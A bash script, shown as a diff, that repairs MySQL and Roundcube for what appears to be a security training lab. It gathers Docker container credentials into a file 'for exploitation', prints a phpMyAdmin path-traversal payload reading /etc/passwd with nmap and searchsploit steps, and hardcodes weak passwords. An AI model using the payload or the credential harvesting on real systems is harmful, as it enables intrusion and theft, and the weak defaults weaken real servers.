@@ -1,0 +1,327 @@
+#!/bin/bash
+
+# Script de diagnostic et réparation MySQL - Iron4Software Lab
+# Auteur: Philippe - Projet Iron4Software
+# Date: 2026-01-21
+
+set -e
+
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+echo -e "${BLUE}"
+echo "=================================================="
+echo "   MySQL Diagnostic & Repair - Iron4Software"
+echo "=================================================="
+echo -e "${NC}"
+
+# Fonction de logging
+log_info() {
+    echo -e "${GREEN}[INFO]${NC} $1"
+}
+
+log_warn() {
+    echo -e "${YELLOW}[WARN]${NC} $1"
+}
+
+log_error() {
+    echo -e "${RED}[ERROR]${NC} $1"
+}
+
+# 1. DIAGNOSTIC INITIAL
+echo -e "\n${BLUE}=== PHASE 1: DIAGNOSTIC ===${NC}"
+
+log_info "Vérification de l'installation MySQL..."
+if dpkg -l | grep -qE "mysql-server|mariadb-server"; then
+    log_info "MySQL/MariaDB est installé"
+    dpkg -l | grep -E "mysql-server|mariadb-server"
+else
+    log_error "MySQL n'est pas installé !"
+    exit 1
+fi
+
+log_info "Vérification de l'espace disque..."
+df -h | grep -E "Filesystem|/var"
+
+log_info "Vérification des ports en écoute..."
+netstat -tlnp | grep -E "3306|mysql" || log_warn "Port 3306 non utilisé"
+
+log_info "Statut actuel de MySQL..."
+systemctl status mysql --no-pager || true
+
+# 2. ANALYSE DES LOGS
+echo -e "\n${BLUE}=== PHASE 2: ANALYSE DES LOGS ===${NC}"
+
+if [ -f /var/log/mysql/error.log ]; then
+    log_info "Dernières erreurs MySQL:"
+    tail -50 /var/log/mysql/error.log | grep -i "error\|fatal\|exception" || log_info "Aucune erreur critique trouvée"
+else
+    log_warn "Fichier de log MySQL non trouvé"
+fi
+
+# 3. VÉRIFICATION DES PERMISSIONS
+echo -e "\n${BLUE}=== PHASE 3: VÉRIFICATION DES PERMISSIONS ===${NC}"
+
+log_info "Permissions du datadir..."
+if [ -d /var/lib/mysql ]; then
+    ls -la /var/lib/mysql/ | head -10
+    
+    OWNER=$(stat -c '%U' /var/lib/mysql)
+    if [ "$OWNER" != "mysql" ]; then
+        log_warn "Le datadir n'appartient pas à l'utilisateur mysql !"
+        log_info "Correction des permissions..."
+        chown -R mysql:mysql /var/lib/mysql
+        chmod -R 755 /var/lib/mysql
+        log_info "Permissions corrigées"
+    else
+        log_info "Permissions OK"
+    fi
+else
+    log_error "Datadir /var/lib/mysql n'existe pas !"
+fi
+
+# 4. VÉRIFICATION DE LA CONFIGURATION
+echo -e "\n${BLUE}=== PHASE 4: CONFIGURATION ===${NC}"
+
+log_info "Vérification de la configuration MySQL..."
+if [ -f /etc/mysql/my.cnf ]; then
+    log_info "Fichier my.cnf trouvé"
+else
+    log_warn "my.cnf non trouvé"
+fi
+
+# 5. TENTATIVE DE RÉPARATION
+echo -e "\n${BLUE}=== PHASE 5: RÉPARATION ===${NC}"
+
+log_info "Arrêt de MySQL (si en cours)..."
+systemctl stop mysql 2>/dev/null || true
+sleep 2
+
+log_info "Réinitialisation du compteur systemd..."
+systemctl reset-failed mysql 2>/dev/null || true
+
+log_info "Vérification du socket MySQL..."
+if [ -S /var/run/mysqld/mysqld.sock ]; then
+    log_warn "Socket résiduel trouvé, suppression..."
+    rm -f /var/run/mysqld/mysqld.sock
+fi
+
+log_info "Vérification du répertoire de run..."
+if [ ! -d /var/run/mysqld ]; then
+    log_info "Création du répertoire /var/run/mysqld..."
+    mkdir -p /var/run/mysqld
+    chown mysql:mysql /var/run/mysqld
+    chmod 755 /var/run/mysqld
+fi
+
+log_info "Tentative de démarrage MySQL..."
+if systemctl start mysql; then
+    log_info "✓ MySQL démarré avec succès !"
+    sleep 3
+    systemctl status mysql --no-pager
+    
+    # Vérifier la connexion
+    log_info "Test de connexion..."
+    if mysql -u root -e "SELECT VERSION();" 2>/dev/null; then
+        log_info "✓ Connexion MySQL OK"
+    else
+        log_warn "MySQL démarre mais connexion impossible sans mot de passe"
+        log_info "Essai avec authentification socket..."
+        sudo mysql -u root -e "SELECT VERSION();" 2>/dev/null || log_warn "Vérifiez l'authentification root"
+    fi
+else
+    log_error "✗ Échec du démarrage MySQL"
+    
+    # Diagnostic approfondi
+    echo -e "\n${YELLOW}Diagnostic approfondi:${NC}"
+    journalctl -u mysql -n 50 --no-pager
+    
+    # Proposition de solutions
+    echo -e "\n${YELLOW}=== SOLUTIONS POSSIBLES ===${NC}"
+    echo "1. Vérifier les logs: sudo cat /var/log/mysql/error.log"
+    echo "2. Réinitialiser MySQL: sudo mysqld --initialize-insecure --user=mysql"
+    echo "3. Désactiver MySQL local et utiliser MySQL Docker"
+    echo "4. Réinstaller MySQL: apt remove --purge mysql-* && apt install mysql-server"
+fi
+
+# 6. CONFIGURATION ROUNDCUBE
+echo -e "\n${BLUE}=== PHASE 6: CONFIGURATION ROUNDCUBE ===${NC}"
+
+if systemctl is-active --quiet mysql; then
+    log_info "Création de la base de données Roundcube..."
+    
+    sudo mysql -u root <<EOF 2>/dev/null || log_warn "Échec de création de la base"
+CREATE DATABASE IF NOT EXISTS roundcubemail CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
+GRANT ALL PRIVILEGES ON roundcubemail.* TO 'roundcube'@'localhost' IDENTIFIED BY 'roundcube_pass';
+FLUSH PRIVILEGES;
+EOF
+    
+    log_info "Bases de données disponibles:"
+    sudo mysql -u root -e "SHOW DATABASES;" 2>/dev/null || true
+    
+    if [ -f /var/www/html/webmail/SQL/mysql.initial.sql ]; then
+        log_info "Import du schéma Roundcube..."
+        sudo mysql -u root roundcubemail < /var/www/html/webmail/SQL/mysql.initial.sql 2>/dev/null || log_warn "Échec import schéma"
+        
+        log_info "Tables Roundcube:"
+        sudo mysql -u root -e "USE roundcubemail; SHOW TABLES;" 2>/dev/null || true
+    fi
+fi
+
+# 7. EXTRACTION DES CREDENTIALS DOCKER
+echo -e "\n${BLUE}=== PHASE 7: EXTRACTION CREDENTIALS DOCKER ===${NC}"
+
+log_info "Recherche des conteneurs phpMyAdmin et MySQL..."
+
+# Vérifier si Docker est en cours d'exécution
+if command -v docker &> /dev/null; then
+    
+    # Extraction credentials phpMyAdmin
+    if docker ps | grep -q "phpmyadmin"; then
+        PHPMYADMIN_CONTAINER=$(docker ps --format "{{.Names}}" | grep phpmyadmin | head -1)
+        log_info "Conteneur phpMyAdmin trouvé: $PHPMYADMIN_CONTAINER"
+        
+        # Extraire les variables d'environnement
+        PMA_USER=$(docker inspect $PHPMYADMIN_CONTAINER | grep -oP 'PMA_USER=\K[^"]+' || echo "root")
+        PMA_PASSWORD=$(docker inspect $PHPMYADMIN_CONTAINER | grep -oP 'PMA_PASSWORD=\K[^"]+' || echo "root")
+        PMA_HOST=$(docker inspect $PHPMYADMIN_CONTAINER | grep -oP 'PMA_HOST=\K[^"]+' || echo "localhost")
+        PMA_PORT=$(docker inspect $PHPMYADMIN_CONTAINER | grep -oP 'PMA_PORT=\K[^"]+' || echo "3306")
+        
+        # Extraire le port exposé sur l'hôte
+        PHPMYADMIN_HOST_PORT=$(docker port $PHPMYADMIN_CONTAINER | grep -oP '0.0.0.0:\K[0-9]+' | head -1)
+        
+        echo -e "${GREEN}Credentials phpMyAdmin:${NC}"
+        echo "  Container: $PHPMYADMIN_CONTAINER"
+        echo "  URL: http://192.168.1.250:${PHPMYADMIN_HOST_PORT}"
+        echo "  User: $PMA_USER"
+        echo "  Password: $PMA_PASSWORD"
+        echo "  MySQL Host: $PMA_HOST"
+        echo "  MySQL Port: $PMA_PORT"
+        
+        # Sauvegarder dans un fichier pour exploitation
+        cat > /tmp/phpmyadmin_creds.txt <<EOF
+# Credentials phpMyAdmin - Iron4Software Lab
+# Date: $(date)
+
+URL=http://192.168.1.250:${PHPMYADMIN_HOST_PORT}
+USER=$PMA_USER
+PASSWORD=$PMA_PASSWORD
+MYSQL_HOST=$PMA_HOST
+MYSQL_PORT=$PMA_PORT
+
+# Commandes utiles pour exploitation:
+# curl "http://192.168.1.250:${PHPMYADMIN_HOST_PORT}/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd"
+# firefox http://192.168.1.250:${PHPMYADMIN_HOST_PORT}
+EOF
+        log_info "Credentials sauvegardés dans: /tmp/phpmyadmin_creds.txt"
+    else
+        log_warn "Aucun conteneur phpMyAdmin en cours d'exécution"
+    fi
+    
+    # Extraction credentials MySQL Docker
+    if docker ps | grep -q "mysql"; then
+        MYSQL_CONTAINER=$(docker ps --format "{{.Names}}" | grep mysql | head -1)
+        log_info "Conteneur MySQL trouvé: $MYSQL_CONTAINER"
+        
+        MYSQL_ROOT_PASSWORD=$(docker inspect $MYSQL_CONTAINER | grep -oP 'MYSQL_ROOT_PASSWORD=\K[^"]+' || echo "root")
+        MYSQL_DATABASE=$(docker inspect $MYSQL_CONTAINER | grep -oP 'MYSQL_DATABASE=\K[^"]+' || echo "testdb")
+        MYSQL_HOST_PORT=$(docker port $MYSQL_CONTAINER | grep -oP '0.0.0.0:\K[0-9]+' | head -1 || echo "3306")
+        
+        echo -e "${GREEN}Credentials MySQL Docker:${NC}"
+        echo "  Container: $MYSQL_CONTAINER"
+        echo "  Host Port: $MYSQL_HOST_PORT"
+        echo "  Root Password: $MYSQL_ROOT_PASSWORD"
+        echo "  Database: $MYSQL_DATABASE"
+        echo "  Connexion: mysql -h 127.0.0.1 -P $MYSQL_HOST_PORT -u root -p$MYSQL_ROOT_PASSWORD"
+    else
+        log_warn "Aucun conteneur MySQL en cours d'exécution"
+    fi
+    
+else
+    log_warn "Docker n'est pas installé ou non accessible"
+fi
+
+# 8. VÉRIFICATION FINALE
+echo -e "\n${BLUE}=== PHASE 8: VÉRIFICATION FINALE ===${NC}"
+
+log_info "Ports en écoute:"
+netstat -tlnp | grep -E "3306|mysql|8080"
+
+log_info "Services actifs:"
+systemctl is-active mysql && echo -e "${GREEN}MySQL: ACTIF${NC}" || echo -e "${RED}MySQL: INACTIF${NC}"
+systemctl is-active apache2 && echo -e "${GREEN}Apache2: ACTIF${NC}" || echo -e "${RED}Apache2: INACTIF${NC}"
+
+if systemctl is-active --quiet mysql; then
+    log_info "Redémarrage d'Apache..."
+    systemctl restart apache2
+    
+    log_info "Test du webmail:"
+    curl -I http://localhost/webmail/ 2>/dev/null | head -3 || log_warn "Webmail non accessible"
+fi
+
+# 9. RAPPORT FINAL
+echo -e "\n${BLUE}=================================================="
+echo "              RAPPORT FINAL"
+echo "=================================================="
+echo -e "${NC}"
+
+echo -e "${BLUE}Status des services:${NC}"
+systemctl is-active mysql && echo -e "  ${GREEN}✓ MySQL Local: ACTIF${NC}" || echo -e "  ${RED}✗ MySQL Local: INACTIF${NC}"
+systemctl is-active apache2 && echo -e "  ${GREEN}✓ Apache2: ACTIF${NC}" || echo -e "  ${RED}✗ Apache2: INACTIF${NC}"
+docker ps | grep -q phpmyadmin && echo -e "  ${GREEN}✓ phpMyAdmin Docker: ACTIF${NC}" || echo -e "  ${RED}✗ phpMyAdmin Docker: INACTIF${NC}"
+docker ps | grep -q mysql && echo -e "  ${GREEN}✓ MySQL Docker: ACTIF${NC}" || echo -e "  ${RED}✗ MySQL Docker: INACTIF${NC}"
+
+if systemctl is-active --quiet mysql; then
+    echo ""
+    echo -e "${GREEN}✓ Infrastructure OPÉRATIONNELLE${NC}"
+    echo ""
+    echo -e "${BLUE}Accès aux services:${NC}"
+    echo "  • Webmail Roundcube: http://192.168.1.250/webmail/"
+    
+    if [ -f /tmp/phpmyadmin_creds.txt ]; then
+        echo "  • phpMyAdmin: http://192.168.1.250:${PHPMYADMIN_HOST_PORT}"
+        echo "    Login: $PMA_USER"
+        echo "    Password: $PMA_PASSWORD"
+    fi
+    
+    echo ""
+    echo -e "${YELLOW}Prochaines étapes - Kill Chain Iron4Software:${NC}"
+    echo "  1. Tester le webmail: firefox http://192.168.1.250/webmail/"
+    echo "  2. Accéder à phpMyAdmin: firefox http://192.168.1.250:${PHPMYADMIN_HOST_PORT}"
+    echo "  3. Lancer l'attaque depuis Kali:"
+    echo "     - Reconnaissance: nmap -sV -p ${PHPMYADMIN_HOST_PORT} 192.168.1.250"
+    echo "     - LFI Test: curl 'http://192.168.1.250:${PHPMYADMIN_HOST_PORT}/index.php?target=db_sql.php%253f/../../../etc/passwd'"
+    echo "     - Exploitation: searchsploit phpmyadmin 4.8"
+    echo "  4. Monitorer dans Splunk: index=linux host=mail*"
+    echo ""
+    echo -e "${GREEN}Fichiers générés:${NC}"
+    echo "  • /tmp/phpmyadmin_creds.txt - Credentials pour exploitation"
+else
+    echo ""
+    echo -e "${RED}✗ MySQL Local n'a pas pu démarrer${NC}"
+    echo ""
+    echo -e "${YELLOW}Actions recommandées:${NC}"
+    echo "  1. Consulter les logs détaillés:"
+    echo "     sudo cat /var/log/mysql/error.log"
+    echo ""
+    echo "  2. Si MySQL local bloque, utiliser uniquement Docker:"
+    echo "     sudo systemctl disable mysql"
+    echo "     sudo systemctl mask mysql"
+    echo ""
+    echo "  3. Configurer Roundcube pour MySQL Docker:"
+    echo "     sudo nano /var/www/html/webmail/config/config.inc.php"
+    echo "     # Modifier: \$config['db_dsnw'] = 'mysql://root:root@127.0.0.1:3307/roundcubemail';"
+    echo ""
+    echo "  4. Si problème persistant, réinstaller MySQL:"
+    echo "     sudo apt remove --purge mysql-* && sudo apt install mysql-server"
+fi
+
+echo ""
+echo -e "${BLUE}=================================================="
+echo "  Script terminé - Iron4Software Lab"
+echo "  MITRE ATT&CK: T1190 - Exploit Public-Facing Application"
+echo "=================================================="
+echo -e "${NC}"
